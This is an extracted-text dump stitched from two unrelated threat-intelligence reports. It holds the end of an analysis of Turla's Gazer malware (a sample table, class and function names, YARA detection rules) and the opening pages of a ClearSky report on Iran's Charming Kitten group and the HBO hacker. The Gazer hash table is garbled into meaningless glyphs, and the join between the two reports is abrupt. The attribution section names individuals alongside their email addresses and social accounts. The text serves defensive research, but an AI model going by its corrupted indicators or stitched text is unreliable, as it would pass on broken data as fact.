signed\nWin\u02db\u02c7/Turla.CC\nDEE\nED\nE\n\u02da\nD\nF\n\u02dc\u02dcB\nD\nGazer \norchestrator x\u02d9\u02dd\n\u02da\u02dc:\u02db\u02dd:\u02c7\u02d8\nnot signed\nWin\u02d9\u02dd/Turla.AA\n\u02d8\nFD\n\u02d8\u02db\u02db\u02d8\u02d8\u02ddB\nA\nEDD\n\u02dd\nFF\nGazer \norchestrator x\u02d9\u02dd\n\u02da\u02dc:\u02db\u02dd:\u02c7\u02d8\nnot signed\nWin\u02d9\u02dd/Turla.AA\nFCA\nB\nE\nB\u02dd\u02d9\u02c7\nC\n\u02c7\u02db\nE\nE\nB\u02d8\nF\nB\u02da\u02ddB\nDA\nD\nD\nGazer \norchestrator x\u02d9\u02dd\n\u02da\u02dc:\u02db\u02dd:\u02c7\u02d8\nnot signed\nWin\u02d9\u02dd/Turla.AA\nDF\nC\nB\nCFD\n\u02ddB\nF\nD\n\u02dc\nA\n\u02da\nF\n\u02db\u02db\u02dd\u02d9\u02dc\u02c6\nA\n\u02dd\u02c7\nF\nGazer \norchestrator x\u02db\u02c7\n\u02da\u02c6:\u02db\u02da:\u02c7\u02c6\nnot signed\nWin\u02db\u02c7/Turla.CC\nB\nAE\n\u02d9\nAE\n\u02d8\u02c7\nC\nF\nB\u02c7\u02dc\nA\n\u02da\nF\n\u02c7\nAD\n\u02dc\nCDE\nD\n\u02dcB\nFF\nF\n\u02d9\nGazer \norchestrator x\u02db\u02c7\n\u02da\u02c6:\u02db\u02da:\u02c7\u02c6\nnot signed\nWin\u02db\u02c7/Turla.CC\n\u02d9\u02dd\nFF\nADC\n\u02c7\u02db\nEE\nF\nB\u02c6\u02d8\nF\n\u02d9\nE\nB\u02dc\u02c6\nED\nGazer \norchestrator x\u02d9\u02dd\nnot signed\nWin\u02d9\u02dd/Turla.AA\nE\n\u02d8\nDE\n\u02d9\u02c7\u02dd\u02ddB\u02c6\u02d8\u02d9\u02c6\u02c7\u02dbB\u02dd\nAFCE\n\u02dc\u02c6\nA\nB\u02d8\u02c6\u02d8\nEF\n\u02d8\u02dc\nAD\n\u02d8\nC\n\u02dcB\nD\nGazer \norchestrator x\u02d9\u02dd\nnot signed\nWin\u02d9\u02dd/Turla.AA\nC\n\u02d8\nEE\n\u02dc\u02ddB\u02db\u02c6\u02dd\nFF\n\u02da\nA\n\u02da\u02c7\nC\n\u02da\u02c6\u02dd\u02dd\nF\n\u02dd\u02da\u02c6\u02dd\u02dd\nE\nE\n\u02da\nE\nGazer \norchestrator x\u02d9\u02dd\nnot signed\nWin\u02d9\u02dd/Turla.AA\nAD\nD\n\u02d8BB\nD\n\u02da\u02d9\nE\nA\nF\nE\nFA\n\u02d8\u02d8\nCF\nB\nE\n\u02c7\nCF\n\u02dbB\nGazer \norchestrator x\u02d9\u02dd\nnot signed\nWin\u02d9\u02dd/Turla.AA\n\u02dd\nCED\nD\nE\nFEE\n\u02d8\u02db\u02d8\nECC\nB\nC\nCF\nGazer \norchestrator x\u02d9\u02dd\nnot signed\nWin\u02d9\u02dd/Turla.AA\n\u02d8\u02d9\nC\n\u02c7\u02d9\u02c6\u02d8\u02d9\u02da\nC\n\u02dc\nCE\n\u02da\u02da\u02dd\u02da\nAD\n\u02dc\u02da\u02d9\nF\nF\n\u02db\u02c7\u02dc\u02d8\nE\nAE\nGazer \norchestrator x\u02d9\u02dd\nnot signed\nWin\u02d9\u02dd/Turla.AA\n\u02dc\u02d9\nF\n\u02db\nE\n\u02d9B\nE\n\u02d9\u02db\u02dd\u02c7\nD\nE\n\u02ddB\u02dc\u02d8\u02dc\nCD\nCFD\nDC\nB\nA\nGazer \norchestrator x\u02d9\u02dd\nnot signed\nWin\u02d9\u02dd/Turla.AA\n \u02dc\u02c6\nSHA1 hash \nComponent\nCompilation \nTime\nCer\nEset Detection \nName\n\u02dd\nA\n\u02d8\nF\nA\nB\nDC\n\u02db\nD\nD\nDC\n\u02d9\nC\n\u02d8\nF\n\u02dc\nAC\nA\n\u02c6\nA\n\u02dd\nGazer \norchestrator x\u02d9\u02dd\nnot signed\nWin\u02d9\u02dd/Turla.AG\n\u02db\u02dbB\u02d9\u02c7\u02d9\u02dc\u02da\nF\nB\u02db\nCF\n\u02dc\u02db\nD\n\u02dc\nE\n\u02c7\u02dd\u02dd\u02dd\u02da\nD\nD\nE\nB\u02c6\u02d9\u02d9\u02da\nEAA\nGazer \norchestrator x\u02d9\u02dd\n\u02c7\u02db:\u02dd\u02c7:\u02c7\u02c6\nnot signed\nWin\u02d9\u02dd/Turla.AD\nE\nA\n\u02dcB\nAD\nF\n\u02dcB\nF\n\u02d9\nECAE\n\u02c6\u02dd\u02dd\nF\nDE\n\u02db\u02d9\nFCCC\nGazer \norchestrator x\u02db\u02c7\nnot signed\nWin\u02db\u02c7/Turla.CF\nF\n\u02daB\u02da\nC\nC\n\u02c7\nF\nB\nD\nB\u02d8\nC\nA\nAFE\nE\n\u02d8\nGazer \norchestrator x\u02d9\u02dd\nnot signed\nWin\u02d9\u02dd/Turla.AD\nA\n\u02c7\nEEC\nC\n\u02d8\nAADF\nF\nD\nD\nAF\nD\n\u02c7\nC\nGazer comm x\u02d9\u02dd\nadmin@solidloop.org\n \nvalid fr\nWin\u02d9\u02dd/Turla.AH\n\u02c6\u02db\u02db\nEF\nFE\nDD\n\u02c6\nE\n\u02da\u02c6\u02da\nE\nF\nF\n\u02c6\u02d9\u02dc\u02dd\nF\nE\n\u02c7\u02dd\u02dc\u02c6\nGazer comm x\u02db\u02c7\n\u02da\u02dc:\u02d8\u02c6:\u02c7\u02c7\nadmin@solidloop.org\n \nvalid fr\nWin\u02db\u02c7/Turla.CC\nC\nDF\nCD\n\u02dc\nC\n\u02da\nA\n\u02dc\u02db\u02ddB\u02db\u02c7\u02d9\u02d8\nDFA\nD\n\u02da\u02d8\nGazer comm x\u02db\u02c7\nnot signed\nWin\u02db\u02c7/Turla.CC\n\u02c6B\u02d8\nEF\n\u02d8\u02dc\nD\n\u02c7\nD\nF\n\u02dc\nFE\n\u02dd\nF\n\u02dc\u02c6\u02c7\nDD\n\u02d9\u02da\u02c6\u02dc\nDC\nE\n\u02d9\nCC\nGazer comm x\u02db\u02c7\n\u02c7\u02db:\u02dd\u02dd:\u02c7\u02dd\nnot signed\nWin\u02db\u02c7/Turla.CF\n\u02dd\nF\n\u02c7\u02c6\nF\nF\n\u02dc\nA\nAE\nC\n\u02db\u02d9\u02d9\u02dd\nF\n\u02d9\nCF\nD\nD\n\u02d9\u02c7\nGazer wiper x\u02db\u02c7\nadmin@solidloop.org\n \nvalid fr\nWin\u02db\u02c7/Turla.CL\n \u02dc\u02c7\nA\nPPEND\nIC\nE\nS\nFunction names\nThere are a few samples of Gazer that use the curror the log \nfunction. Here is a list of some function names used in Gazer:\nAutorunManager Class\nAutorunManager::~AutorunManger\nAutorunManager::Init\nAutorunManger::ReInit\nAutorunManager::BuildAutorunSettings\nAutorunManager::FreeAutorunsSettings\nAutorunManager::FullCheck\nAutorunManager::StartAutorunEx\nAutorunManager::FullStart\nHiddenTaskAutorun Class\n\nHiddenTaskAutorun::IsPathsEqual\nLinkAutorun Class\n\nLinkAutorunClass::InfectLnkFile\nLinkAutorunClass::ClearLnkFile\nLinkAutorunClass::CheckLnkFile\nRemoteImport32 Class\n\nRemoteImport32::RemoteImport32\nRemoteImport32::GetRemoteProcAddress\nRemoteImport32::GetRemoteModuleHandle\nScreenSaverAutorun Class\nScreenSaverAutorun::ChangeScreenSaver\nScreenSaverAutorun::WndProc1\nScreenSaverAutorun::GetMessageThreadProc\nScreenSaverAutorun::CreateHiddenWindow\nScreenSaverAutorun::CloseHiddenWindow\nShellAutorun Class\nShellAutorun::AutorunInstallEx\nShellAutorun::AutorunUninstallEx\nShellAutorun::AutorunCheckEx\nShellAutorun::IsPathsEqual\nStartupAutorun Class\n\nStartupAutorun::AutorunInstallEx\nStartupAutorun::AutorunUninstallEx\nStartupAutorun::AutorunCheckEx\nStartupAutorun::IsPathsEqual\nTaskScheduler20Autorun Class\n\nTaskScheduler20Autorun::Init\nTaskScheduler20Autorun::AutorunCheckEx\nTaskScheduler20Autorun::AutorunInstallEx\nTaskScheduler20Autorun::AutorunUninstallEx\nTaskScheduler20Autorun::IsPathsEqual\n \u02dc\u02d8\nDllInjector Class\nDllInjector::LoadDllToProcess\nDllInjector::GetProcHandle\nDllInjector::CheckDllAndSetPlatform\nDllInjector::CopyDllFr\nDllInjector::MapLibrary\nDllInjector::Map86Library_tox64\nDllInjector::CallEntryPoint\nDllInjector::FindDllImageBase\nDllInjector::WindowInject\nInjectManager Class\n\nInjectManager::~InjectManager\nInjectManager::BuildInjectSettingsList\nInjectManager::FreeInjectSettingsList\nInjectManager::Stop\nInjectManager::DetachAll\nInjectManager::FindAndInjectInVictim\nInjectManager::FindProcessSimple2\nInjectManager::LoadNtdll\nInjectManager::UnLoadNtdll\nInjectManager::LoadWinsta\nInjectManager::UnLoadWinsta\nInjectManager::SetStatusTransportDll\nInjectManager::GetTransportState\nInjectManager::DestroyManuallyCreatedVictim\nInjectManager::VictimManualCreateIE\nTNPTransport Class\n\nTNPTransport::Init\nTNPTransport::ReInit\nTNPTransport::~TNPTransport\nTNPTransport::Receive\nTNPTransport::RunServer\nTNPTransport::ServerProc\nExeStorage Class\n\nExeStorage::Migrate\nExeStorage::SecureHeapFree\nFSStorage Class\nFSStorage::~FSStorage\nFSStorage::Init\nFSStorage::GetBlock\nFSStorage::GetListBlock\nFSStorage::Migrate\nFSStorage::SecureHeapFree\nFSStorage::Update\nFSStorage::Empty\nRegStorage Class\nRegStorage::~RegStorage\nRegStorage::Init\nRegStorage::FreeList\n \u02dc\u02dd\nRegStorage::GetListBlock\nRegStorage::DeleteListBlock\nRegStorage::Migrate\nRegStorage::SecureHeapFree\nRegStorage::Update\nRegStorage::Empty\nResultQueue Class\nResultQueue::~ResultQueue\nResultQueue::DumpQueueToStorage\nResultQueue::RestoreFromStorage\nResultQueue::ClearQueue\nResultQueue::RemoveResult\nResultQueue::GetNextResultToSendWithModule\nResultQueue::SetPredeterminedResult\nResultQueue::print\nTaskQueue Class\nTaskQueue::~TaskQueue\nTaskQueue::DumpQueueToStorage\nTaskQueue::RestoreFromStorage\nTaskQueue::ClearQueue\nTaskQueue::RemoveCompletedTasks\nTaskQueue::print\nCExecutionSubsystem Class\n\nCExecutionSubsystem::~CExecutionSubsystem\nCExecutionSubsystem::Stop\nCExecutionSubsystem::TaskExecusion\nCExecutionSubsystem::Te\nCExecutionSubsystem::TaskUpload\nCExecutionSubsystem::TaskDownload\nCExecutionSubsystem::TaskReplacement\nCExecutionSubsystem::TaskDelete\nCExecutionSubsystem::TaskPacketLocalTransport\nCExecutionSubsystem::FinishTask\nCExecutionSubsystem::PushTaskResult\nCExecutionSubsystem::UpdateStorage\nCMessageProcessingSystem Class\n\nCMessageProcessingSystem::~CMessageProcessing\nCMessageProcessingSystem::ListenerCallBack\nCMessageProcessingSystem::WaitShutdownModule\nCMessageProcessingSystem::SetCompulsorySMC\nCMessageProcessingSystem::UnSetCompulsorySMC\nCMessageProcessingSystem::IsCompulsorySMC\nCMessageProcessingSystem::GetCompulsorySMC\nCMessageProcessingSystem::Receive_TAKE_NOP\nCMessageProcessingSystem::Receive_GIVE_SETTINGS\nCMessageProcessingSystem::Receive_TAKE_CAN_NOT_WORK\nCMessageProcessingSystem::Receive_GIVE_CACHE\nCMessageProcessingSystem::Receive_TAKE_CACHE\nCMessageProcessingSystem::Receive_TAKE_TASK\nCMessageProcessingSystem::Receive_GIVE_RESULT\n CMessageProcessingSystem::Receive_TAKE_CONFIRM_RESULT\nCMessageProcessingSystem::Receive_TAKE_LOADER_BODY\nCMessageProcessingSystem::Receive_TAKE_UNINSTALL\nCMessageProcessingSystem::Receive_NO_CONNECT_TO_Gazer\nCMessageProcessingSystem::Receive_TAKE_LAST_CONNECTION\nCMessageProcessingSystem::Send_TAKE_FIN\nCMessageProcessingSystem::Send_TAKE_SHUTDOWN\nCMessageProcessingSystem::Send_TAKE_SETTINGS\nCMessageProcessingSystem::Send_TAKE_RESULT\nCrypto Class\nCrypto::GetPublicKey\nCrypto::EncryptRSA\nCrypto::Sign\nCrypto::Encr\nCrypto::DecryptRSA\nCrypto::Verify\nCrypto::DecryptAndV\nCrypto::Encr\nCrypto::EncrC\nCrypto::DecryptAndV\nCrypto::DecryptAndV\nCrypto::DecryptAndV\nCrypto::VerifyLoaderFile\nCrypto::VerifyLoader\nCrypto::Compr\nCrypto::Decompr\nLTManager Class\n\nLTManager::~LTManager\nLTManager::Init\nLTManager::GetResultFromQueue\nLTManager::SetResultToCache\nLTManager::GetTaskFromCache\nLTManager::SetTaskToQueue\nLTManager::IsSendPacketFurtherOnRoute\nLTManager::SendPacketNextRouteUnit\nLTManager::SetCache\nLTManager::SetPacket\nLTManager::DumpCacheToStorage\nLTManager::DeSerializeCache\nLTManager::DeSerializePacket\nLTManager::DeSerializeRoute\nLTManager::DeSerializeTask\nLTManager::DeSerializeResult\nLTManager::SerializeCache\nLTManager::SerializePacket\nLTManager::SerialiazeRoute\nLTManager::SerializeTask\nLTManager::SerializeResult\nLTManager::ClearCache\nLTManager::ClearPacket\nLTManager::ClearRoute\n LTManager::ClearTask\nLTManager::ClearResult\nLTManager::PrintCache\nLTManager::CreateEvents\nLTManager::SetEvents\nLTManager::ResetEvents\nLTManager::WaitEvents\nLTManager::DeleteEvents\nLTMessageProcessing Class\nLTMessageProcessing::ListenerCallBack\nLTMessageProcessing::Send_TAKE_OK\nLTMessageProcessing::Send_TAKE_ERROR_CRYPT\nLTMessageProcessing::Send_TAKE_ERROR_UNKNOWN\nLTNamedPipe Class\nLTNamedPipe::ReInit\nLTNamedPipe::BuildLocalTransportSettings\nLTNamedPipe::~LTNamedPipe\nLTNamedPipe::Receive\nLTNamedPipe::RunServer\nLTNamedPipe::Stop\nLTNamedPipe::CreateNewNPInstance\nLTNamedPipe::ServerProc\nLTNamedPipe::ClientCommunication\nYara rules\nimport \ufb01pe\ufb02\nimport \ufb01math\ufb02\n\nimport \ufb01hash\ufb02\nrule Gazer_certificate_subject {\n  condition:\n\n    for any i in (0..pe.number_of_signatures - 1):\n\n       (pe.signatures[i].subject contains \ufb01Solid Loop\ufb02 or \n\npe.signatures[i].subject contains \ufb01Ultimate Computer Support\ufb02)\n\n}\nrule Gazer_certificate\n{\n\n  strings:\n\n    $certif1 = {52 76 a4 53 cd 70 9c 18 da 65 15 7e 5f 1f de 02}\n\n    $certif2 = {12 90 f2 41 d9 b2 80 af 77 fc da 12 c6 b4 96 9c}\n\n  condition:\n\n    (uint16(0) == 0x5a4d) and 1 of them and filesize < 2MB\n\n}\nrule Gazer_logfile_name\n{\n\n    strings:\n\n     $s1 = \ufb01CVRG72B5.tmp.cvr\ufb02\n\n     $s2 = \ufb01CVRG1A6B.tmp.cvr\ufb02\n\n     $s3 = \ufb01CVRG38D9.tmp.cvr\ufb02\n\n    condition:\n\n    (uint16(0) == 0x5a4d) and 1 of them\n\n}\n ", " \n \n \n \n \nCharming Kitten\n \n \nIranian cyber espionage against \nh\numan \nr\nights\n \nactivists\n, \na\ncademic researchers and media\n \noutlets\n \n-\n \na\nnd the HBO hacker connection\n \n \n \n \nClearSky Cyber Security \n \n \nDecember\n \n2017\n \n \n \n \n  \nPage \n2\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \n \nContents\n \nIntroduction\n \n................................\n................................\n................................\n................................\n..........................\n \n3\n \nTargets\n \n................................\n................................\n................................\n................................\n.........................\n \n3\n \nCharming Kitten or Rocket kitten?\n \n................................\n................................\n................................\n.......................\n \n4\n \nThe HBO hacker and Charming Kitten\n \n................................\n................................\n................................\n..................\n \n5\n \nHBO hacking indictment\n \n................................\n................................\n................................\n..............................\n \n5\n \nConnection to Iranian government backed threat agent\n \n................................\n................................\n............\n \n5\n \nFrom Mesri\n \nto Charming Kitten\n \n................................\n................................\n................................\n...................\n \n6\n \nDelivery and Infection\n \n................................\n................................\n................................\n................................\n........\n16\n \nMade up organizations and people\n \n................................\n................................\n................................\n...............\n16\n \nBritish News\n \n................................\n................................\n................................\n................................\n...............\n16\n \nMade up studens and jurnalists\n \n................................\n................................\n................................\n.................\n24\n \nImpersonating real companies\n \n................................\n................................\n................................\n.......................\n30\n \nUnited Technologies impersonation\n \n................................\n................................\n................................\n..........\n30\n \nWatering holes\n \n................................\n................................\n................................\n................................\n...............\n32\n \nSpear Phishing for credential stealing\n \n................................\n................................\n................................\n............\n34\n \nWave 1\n \n................................\n................................\n................................\n................................\n.......................\n34\n \nWave 2\n \n................................\n................................\n................................\n................................\n.......................\n36\n \nWave 3\n \n................................\n................................\n................................\n................................\n.......................\n37\n \nEmail tracking service\ns\n \n................................\n................................\n................................\n...............................\n45\n \nTargeted emails with malware\n \n................................\n................................\n................................\n.......................\n46\n \nDownPaper\n\nM\nalware\n \n................................\n................................\n................................\n................................\n..........\n47\n \nAdditional samples\n................................\n................................\n................................\n................................\n.....\n49\n \nMAGICHOUND\n.RETRIEVER\n \n................................\n................................\n................................\n................................\n.\n50\n \nAppendix A \n-\n \nIndicators of Compromise\n \n................................\n................................\n................................\n.............\n51\n \nAppendix B \n-\n \nPrevious reports about Charming Kitten and Rocket Kitten\n \n................................\n.........................\n59\n \n \n \n  \nPage \n3\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \nIntroduction\n \nCharming Kitten\n \nis a\nn Iranian\n \ncyberespionage group\n \noperating since \napproximately\n \n2014\n. \nThis report exposes\n \ntheir \nvast espionage apparatus\n, active\n \nduring\n \n2016\n-\n2017\n. \nWe present\n \nincidents \nof \ncompany \nimpersonation\n, \nmade up \norganizations\n \nand individual\ns\n, \nspear phishing\n \nand \nwatering\n \nhole attacks. \nWe analyze their \nexploitation, delivery\n,\n \nand command\n-\nand\n-\ncontrol infrastructure\n,\n \nand \nexpose \nDownPaper\n, a \nmalware \ndeveloped by the attacker\ns,\n \nwhich has not been publicly documented\n \nto date\n. \n \nI\nncidents\n \ndocumented \nin this report are lik\nely a small fraction of the actual amount of targeted attacks, \nwhich may \nreach\n \nthousands\n \nof \nindividuals\n. \nWe expose more \nthan\n \n85 IP addresses, \n240 malicious domains\n, \nhundreds of hosts\n, and \nmultiple fake entities\n \n\n \nmos\nt of which \nwere \ncreated in 2016\n-\n2017.\n \nTh\ne most recent \ndomains (\ncom\n-\narchivecenter[.]work\n, \ncom\n-\nmessengerservice[.]work\n \nand \ncom\n-\nvideoservice[.]work\n) \nwere\n \nregistered on December 2\nnd\n, 2017, and have \nprobably \nnot been used in attacks yet.\n \nWe present the connection between \nBehzad Mesri\n, \nan Iranian \nnational\n \nrecently indicted for his\n \ninvolvement \nin \nhacking HBO\n, \nand \nCharming Kitten. \nWe also identify other members of the group.\n \nThis report refers to two likely distinct groups\n,\n \nCharming Kitten\n \nand \nRocket Kitten\n,\n \ntogether\n.\n \nThis is not to \nsay that the two \ngroups are one, but that due to overlap in infrastructure, tools, targets, and \nmodus \noperandi \nw\ne\n \nare unable to precisely attribute each incident\n \nto one or the other\n.\n \nFurther \ndiscussion appears \nin \nthe \nsection \"\nCharming Kitten or Rocket kitten?\n\"\n \nTargets\n \nThe attackers' \nfocus appears to be \nindividuals \nof \ninterest\n \nto Iran\n \nin the fields of \nAcademic research\n \n(i.e. \nIranist\ns\n \n-\n \nScholars who study Iran\n)\n, \nHuman right\n \nand \nmedia\n. \nEmphasis\n \nis \ngiven\n \nto \nIra\nnian\n \ndissidents \nl\niving\n \nin \nIran or abroad\n,\n \nand \npeople who come in\n \ntouch with Iranians or report on Iranian affairs such as journalists \nand reporters, media outlets covering Iran, \nand\n \npolitical advisors\n. \n \nMost targets \nknown to us \nare \nindividuals living \nin Iran,\n \nthe \nUnited \nS\ntates, Israel, \nand \nthe \nUK\n. \nOthers live \nin \nTurkey\n, \nFrance\n, Germany, Switzerland, United Arab Emirates, India, Denmark\n \nand \nother countries\n.\n \nNotably, the attackers \nusually \ntry to gain access to private email and Facebook\n \naccounts.\n \nT\nhey \nseek \nto \ninfiltrate the targets\n\n \nsocial network \nas \na hop point to \nbreach\n \nother\n \naccounts\n \nin their social \nnetwork\n, or to \ncollect information about \ntheir \ntarget\ns\n. \nSometimes, \nthey \naim at\n \nestablish\ning\n \na foothold on the \n\ncomputer to \ngain access into \ntheir organization\n, but\n,\n \nbased on our data, this \nis \nusually not their main \no\nbjective, as opposed to \nother \nIranian threat groups\n,\n \nsuch\n \nas\n \nOilrig\n1\n \nand \nCopyKittens\n2\n.\n \n \n \n \n \n                                        \n                  \n \n1\n \nhttp://www.clearskysec.com/oilrig/\n \n \n2\n \nhttp://www.clearskysec.com/tulip/\n \n \n  \nPage \n4\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \nCharming Kitten or Rocket kitten?\n \nWhile Iranian threat actors have been well documented by security researchers, the inner workings of the \necosystem of Iran's hackers is not entirely clear. Groups \ncan be vigorously active \nfor years \nand then \ndisappear abruptly, sometimes due to being public\nly outed. Researchers make a best\n-\nfaith effort to assign \noperations to certain groups, but \nthe instability in the field \nmakes the process \nchallenging\n. \n \nA case of these \nobscure \nlines can be found in \na\n \nblogpost \npublished in \ncoordination and \nparallel to this \nreport \n-\n\n3\n \nby Collin Anderson and Claudio \nGuarnieri. Flying Kitten \n(which is another name given by the security industry to Charming \nK\nitten) \nwas one of \nthe first groups to be described as \na coherent threat actor conducting operations against political opponents \nof the \nIRI\n \n(Islamic Republic of Iran) \n\n\ngainst aviation firms, led to the \ndismantling of \nFlying kitten's \ninfrastructure and the \napparent \nend of its activities. Months later, another\n,\n \n\nseries \nof reports. \n \nWhile the two groups \nexhib\nited \ndifferent behaviors that lend credence to the \nassumption \nthey were \ndistinct\n, \ndisclosures of private toolkits strongly suggest that Rocket Kitten had used Flying Kitten resources \nthroughout its credential\n-\ntheft operations. Moreover, Rocket Kitten had \nexperimented with reusing malware \nthat appeared to be a\nn\n \nundisclosed precursor to \nFlying Kitten's \n\nThese overlaps provide \nsome \nindication that Rocket Kitten had some relationship to Flying Kitten \n\n \nperhaps \nmembers \nof t\nhe latter joining \nthe new team. Rocket Kitten has since largely subsided as a formidable actor, \nand repeating the theme of its predecessor now only appears in echoes of other campaigns. \n \nRead \n-\n\n \n\nhere:\n \nhttps://iranthreats.github.io/resources/attribution\n-\nflying\n-\nrocket\n-\nkitten\n. \n \nFurther \ninformation \nis available in\n \n\"\nAppendix\n \nB \n-\n \nPrevious reports about Charmi\nng Kitten and Rocket Kitten\n\".\n \n \n \n \n                                        \n                  \n \n3\n \nhttps://iranthreats.github.io/resources/attribution\n-\nflying\n-\nrocket\n-\nkitten\n \n \n  \nPage \n5\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \nThe \nHBO\n \nhacker and Charming Kitten\n \nHBO hacking indictment \n \nIn \nNovember 21, 2017\n, the \nUnited States Department of Justice\n \nunsealed\n \nan \nindictment\n4\n \nagainst \nBehzad \nMesri\n \n\nSkote Vahshat\n\n)\n5\n \nfor his \ninvolvement \nhacking and extorting HBO, and for subsequently \nleakin\ng\n \nthe stolen content on the Internet\n.\n \nLeaked \ncontent\n \nincluded \nconfidential information about upcoming \n\nepisodes \nof other television series created by HBO\n6\n.\n \n \nAccording to the indictment, \"\nMesri\n \nis an Iran\n-\nbased computer hacker who had previously worked on behalf \nof the Iranian military to conduct computer network attacks that targeted military systems, nucl\near software \nsystems, and Israeli infrastructure.  At certain times, \nMesri\n \nhas been a member of an Iran\n-\nbased hacking \ngroup called the \nTurk Black Hat\n \nsecurity team\n\".\n \nC\nonnection\n \nto \nIranian government backed threat agent\n \nSecurity researcher \nCollin Anderson o\nf \nIran Threats\n7\n \ntagged\n \nMesri\n's\n \ntwitter account\n8\n \nin a tweet\n9\n \nsuggesting \nthat \nMesri\n \nmight be related to Charming Kitten. \n \n                                        \n                  \n \n4\n \nhttps://www.justice.gov/usao\n-\nsdny/pr/acting\n-\nmanhattan\n-\nus\n-\nattorney\n-\nannounces\n-\ncharges\n-\nagainst\n-\niranian\n-\nnational\n-\nconducting\n \n \n5\n \nhttps://www.fbi.gov/wanted/cyber/behzad\n-\nmesri\n \n \n6\n \nOther stolen content includes: \n(a) confidential video files containing unaired episodes of original HBO television \nprograms, including episodes of \n\n;\n \n(b) scripts \nand plot summaries for unaired program\ns\n\n; \n(c) confidential \ncast and crew contact lists; (d) emails belonging to \nat least one HBO employee; (e) financial documents; and (f) online \n\n \n7\n \nhttps://iranthreats.github.io/\n \n \n8\n \nhttps://twitter.com/skote_vahshat\n \n \n9\n \nhttps://twitter.com/CDA/status/932992141466279936\n \n \n  \nPage \n6\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \n \nSubsequently, we \ntried\n \nto find \nconnections \nof \nMesri\n \nto other \nactivit\nies\n \nand people \nmentioned \nin this \nreport.\n \nThanks \nto the public nature of \nhow \nMesri\n \nand other \nmembers \nof \nTurk Black Hat\n \nconducted\n \ntheir hacking \nactivities and private \nonline life, we \ncould\n \nfind several connections. \nThis is not to say that the HBO hack was \nordered by the Iranian government. Rather, we try \nto strengthen \nthe assumption that \nMesri \nwas\n,\n \nat \na \ncertain \ntime\n,\n \npart of\n,\n \nor related\n \nto Charming Kitten. \nIn addition\n, we \nunmask other members \nof the group based on \ntheir \nconnection\n \nto \nMesri\n \nand to \nCharming Kitten\n \ninfrast\nructure\n. \n \nFrom \nMesri\n \nto Charming Kitten\n \nArYaIeIrAN\n \n(\nAKA\n \naryaieiran@gmail.com\n \nAKA \naryaieiran@hotmail.com\n \nAKA\n \nmno_1988_fgh@yahoo.com\n) \nis a 29 years old \nIranian \nhacker\n \nand member of \nTurk Black Hat\n. Below is his profile page\n \nin \"\nIranian \nengineers club\n\"\n10\n:\n \n \n                                        \n                  \n \n10\n \nhttp://www.iran\n-\neng.ir/member.php/77662\n-\nArYaiEiRan?langid=1\n \n  \nPage \n7\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \nA list\n \nof\n \nwebsites he \ndefaced\n, listed on \nZone\n-\nH\n11\n:\n \nAnd a mirror page of a defacement he made in 2012, showing some of his team members and email address:\n \n \n                                        \n                  \n \n11\n \nhttp://www.zone\n-\nh\n.org/archive/notifier=ArYaIeIrAn\n \n  \nPage \n8\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \n \nThe same\n \nemail\n \naddress\n,\n \naryaieiran@gmail.com\n,\n \nshows up in the SOA (\nStart of Authority\n) record\n \nof multiple \ndomains registered \nand used \nby \nCharming Kittens\n \nthat are presented in this report\n. \nThese include \nbritishnews.com[.]co, britishnews[.]org, broadcastbritishnews[.]com and mehrnews[.]info\n. \nAl\nl\n \nt\nhese websites \nused \npersiandns\n[\n.\n]\nnet\n \nas their NS (name\n \nserver)\n,\n \nas\n \ncan be seen in PassiveTotal\n12\n \n13\n:\n \n \n \n                                        \n                  \n \n12\n \nhttps://community.riskiq.com/search/britishnews.org\n \n \n13\n \nhttps://community.riskiq.co\nm/search/britishnews.com.co\n \n \n  \nPage \n9\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \naryaieiran@gmail.com\n \nalso \nregister\ned\n \npersiandns\n[\n.\n]\nnet\n, potentially indicating that he is the administrator of \nthe services\n \nand an employee in the \ncompany\n:\n \n \nIn a \ndefacement,\n \nstill online \nat the time of \nwriting\n, both \nArYaIeIrAn\n \nand Skote_Vahshat, the HBO hacker, \ntake \ncredit as\n \nmembers of Turk Black Hat.\n \nThis indicates that both were members of \nTurk Black Hat\n \nat the same \ntime, and likely knew \neach other\n.\n \n  \nPage \n10\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \npersiandns[.]net \nhosting \nservices, which hosted mal\nicious domains used by charming kitten\n,\n \nredirects to \nmahanserver[.]ir\n, indicating it is the same company:\n \n \nThe about page\n \n(\n\n)\n \nof \nmahanserver[.]ir\n \nleads to a 404\n \nerror\n \npage\n:\n \n \n  \nPage \n11\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \nThe CEO of mahanserver[.]ir \nis \nMohammad Rasoul Akbari\n \n(A.K.\nA \nra3ou1\n)\n,\n \nlikely t\nhe boss or partner of \nArYaIeIrA:\n \n \n \n \n \n  \nPage \n12\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \nThe two \nfollow each other on twitter:\n \nAkbari\n \nis a Facebook friend of \nthe HBO hacker, \nBehzad Mesri\n \n14\n.\n \n \n                                        \n                  \n \n14\n \nhttps://www.facebook.com/friendship/sk0te.vahshat/ra3ou1/\n  \n \n  \nPage \n13\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \nOn Linkedin, \nMahanServer\n \nonly ha\ns\n \ntwo employees\n:\n \nCEO \nMohammad Rasoul Akbari\n \nand Mohammadamin \nKeshvari:\n \nInterestingly, \nMohammadamin Keshvari\n's\n \nprofile picture is a pomegranate, like th\nat \nof \nArYaIeIrAN\n\n \nt\nwitter \naccount\n15\n:\n \n \n \n \n \n                                        \n                  \n \n15\n \nhttps://twitter.com/aryaieiran\n \n \n  \nPage \n14\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \nMoreover, \nMohammadamin Keshvari \nmentions in his \nLinkedIn\n \nprofile that he works at\n \nARia 